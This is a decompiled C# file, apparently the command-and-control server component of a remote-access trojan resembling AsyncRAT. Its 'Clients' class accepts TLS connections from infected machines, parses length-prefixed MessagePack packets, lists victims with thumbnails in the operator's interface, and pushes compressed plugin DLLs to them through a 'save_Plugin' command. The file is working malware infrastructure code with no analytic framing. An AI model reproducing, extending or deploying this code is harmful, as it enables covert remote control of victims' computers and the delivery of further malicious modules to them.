using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Connection
{
	// Token: 0x02000032 RID: 50
	public class Clients
	{
		// Token: 0x17000036 RID: 54
		// (get) Token: 0x060001CF RID: 463 RVA: 0x00002D02 File Offset: 0x00000F02
		// (set) Token: 0x060001D0 RID: 464 RVA: 0x00002D0A File Offset: 0x00000F0A
		public Socket TcpClient { get; set; }

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x060001D1 RID: 465 RVA: 0x00002D13 File Offset: 0x00000F13
		// (set) Token: 0x060001D2 RID: 466 RVA: 0x00002D1B File Offset: 0x00000F1B
		public SslStream SslClient { get; set; }

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x060001D3 RID: 467 RVA: 0x00002D24 File Offset: 0x00000F24
		// (set) Token: 0x060001D4 RID: 468 RVA: 0x00002D2C File Offset: 0x00000F2C
		public ListViewItem LV { get; set; }

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x060001D5 RID: 469 RVA: 0x00002D35 File Offset: 0x00000F35
		// (set) Token: 0x060001D6 RID: 470 RVA: 0x00002D3D File Offset: 0x00000F3D
		public ListViewItem LV2 { get; set; }

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x060001D7 RID: 471 RVA: 0x00002D46 File Offset: 0x00000F46
		// (set) Token: 0x060001D8 RID: 472 RVA: 0x00002D4E File Offset: 0x00000F4E
		public string ID { get; set; }

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x060001D9 RID: 473 RVA: 0x00002D57 File Offset: 0x00000F57
		// (set) Token: 0x060001DA RID: 474 RVA: 0x00002D5F File Offset: 0x00000F5F
		private byte[] ClientBuffer { get; set; }

		// Token: 0x1700003C RID: 60
		// (get) Token: 0x060001DB RID: 475 RVA: 0x00002D68 File Offset: 0x00000F68
		// (set) Token: 0x060001DC RID: 476 RVA: 0x00002D70 File Offset: 0x00000F70
		private long HeaderSize { get; set; }

		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060001DD RID: 477 RVA: 0x00002D79 File Offset: 0x00000F79
		// (set) Token: 0x060001DE RID: 478 RVA: 0x00002D81 File Offset: 0x00000F81
		private long Offset { get; set; }

		// Token: 0x1700003E RID: 62
		// (get) Token: 0x060001DF RID: 479 RVA: 0x00002D8A File Offset: 0x00000F8A
		// (set) Token: 0x060001E0 RID: 480 RVA: 0x00002D92 File Offset: 0x00000F92
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x060001E1 RID: 481 RVA: 0x00002D9B File Offset: 0x00000F9B
		// (set) Token: 0x060001E2 RID: 482 RVA: 0x00002DA3 File Offset: 0x00000FA3
		public object SendSync { get; set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x060001E3 RID: 483 RVA: 0x00002DAC File Offset: 0x00000FAC
		// (set) Token: 0x060001E4 RID: 484 RVA: 0x00002DB4 File Offset: 0x00000FB4
		public long BytesRecevied { get; set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x060001E5 RID: 485 RVA: 0x00002DBD File Offset: 0x00000FBD
		// (set) Token: 0x060001E6 RID: 486 RVA: 0x00002DC5 File Offset: 0x00000FC5
		public string Ip { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060001E7 RID: 487 RVA: 0x00002DCE File Offset: 0x00000FCE
		// (set) Token: 0x060001E8 RID: 488 RVA: 0x00002DD6 File Offset: 0x00000FD6
		public bool Admin { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060001E9 RID: 489 RVA: 0x00002DDF File Offset: 0x00000FDF
		// (set) Token: 0x060001EA RID: 490 RVA: 0x00002DE7 File Offset: 0x00000FE7
		public DateTime LastPing { get; set; }

		// Token: 0x060001EB RID: 491 RVA: 0x0001E4F0 File Offset: 0x0001C6F0
		public Clients(Socket socket)
		{
			this.SendSync = new object();
			this.TcpClient = socket;
			this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
			this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
		}

		// Token: 0x060001EC RID: 492 RVA: 0x0001E57C File Offset: 0x0001C77C
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0L;
				this.HeaderSize = 4L;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
			}
			catch
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
		}

		// Token: 0x060001ED RID: 493 RVA: 0x0001E61C File Offset: 0x0001C81C
		public void ReadClientData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Disconnected();
				}
				else
				{
					int num = this.SslClient.EndRead(ar);
					if (num > 0)
					{
						this.HeaderSize -= (long)num;
						this.Offset += (long)num;
						if (!this.ClientBufferRecevied)
						{
							if (this.HeaderSize == 0L)
							{
								this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
								if (this.HeaderSize > 0L)
								{
									this.ClientBuffer = new byte[this.HeaderSize];
									this.Offset = 0L;
									this.ClientBufferRecevied = true;
								}
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						else
						{
							object lockReceivedSendValue = Settings.LockReceivedSendValue;
							lock (lockReceivedSendValue)
							{
								Settings.ReceivedValue += (long)num;
							}
							this.BytesRecevied += (long)num;
							if (this.HeaderSize == 0L)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
								{
									client = this,
									data = this.ClientBuffer
								}.Read), null);
								this.Offset = 0L;
								this.HeaderSize = 4L;
								this.ClientBuffer = new byte[this.HeaderSize];
								this.ClientBufferRecevied = false;
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
					}
					else
					{
						this.Disconnected();
					}
				}
			}
			catch
			{
				this.Disconnected();
			}
		}

		// Token: 0x060001EE RID: 494 RVA: 0x0001E7FC File Offset: 0x0001C9FC
		public void Disconnected()
		{
			if (this.LV != null)
			{
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						object obj = Settings.LockListviewClients;
						lock (obj)
						{
							this.LV.Remove();
						}
						if (this.LV2 != null)
						{
							obj = Settings.LockListviewThumb;
							lock (obj)
							{
								this.LV2.Remove();
							}
						}
					}
					catch
					{
					}
					new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Red);
					if (TimeZoneInfo.Local.Id == "China Standard Time" && Settings.Default.Notification)
					{
						SoundPlayer soundPlayer = new SoundPlayer(Resources.offline);
						soundPlayer.Load();
						soundPlayer.Play();
					}
					foreach (AsyncTask asyncTask in FormMain.getTasks.ToList<AsyncTask>())
					{
						asyncTask.doneClient.Remove(this.ID);
					}
				}));
			}
			try
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001EF RID: 495 RVA: 0x00012788 File Offset: 0x00010988
		public bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x060001F0 RID: 496 RVA: 0x0001E860 File Offset: 0x0001CA60
		public void Send(object msg)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (!this.TcpClient.Connected)
					{
						this.Disconnected();
					}
					else if ((byte[])msg != null)
					{
						byte[] array = (byte[])msg;
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(bytes, 0, bytes.Length);
						object lockReceivedSendValue;
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.SslClient.Write(array2, 0, num);
									lockReceivedSendValue = Settings.LockReceivedSendValue;
									lock (lockReceivedSendValue)
									{
										Settings.SentValue += (long)num;
									}
								}
								goto IL_15B;
							}
						}
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(array, 0, array.Length);
						this.SslClient.Flush();
						lockReceivedSendValue = Settings.LockReceivedSendValue;
						lock (lockReceivedSendValue)
						{
							Settings.SentValue += (long)array.Length;
						}
						IL_15B:;
					}
				}
				catch
				{
					this.Disconnected();
				}
			}
		}

		// Token: 0x060001F1 RID: 497 RVA: 0x0001EA5C File Offset: 0x0001CC5C
		public void SendPlugin(string hash)
		{
			try
			{
				foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
				{
					if (hash == GetHash.GetChecksum(text))
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
						new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + this.Ip, Color.Gainsboro);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Red);
			}
		}
	}
}
